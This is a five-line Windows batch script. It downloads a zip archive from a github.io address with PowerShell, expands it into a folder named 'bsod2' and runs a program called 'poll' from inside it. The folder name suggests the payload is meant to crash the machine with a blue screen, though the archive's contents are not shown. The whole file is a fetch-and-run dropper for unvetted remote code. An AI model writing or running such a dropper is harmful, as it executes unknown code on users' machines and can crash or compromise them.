@echo off
powershell -Command Invoke-Webrequest -URI terencep1.github.io/what.zip -OutFile what.zip
powershell -Command  expand-archive -LiteralPath what.zip -Force -DestinationPath bsod2
cd bsod2\what
poll
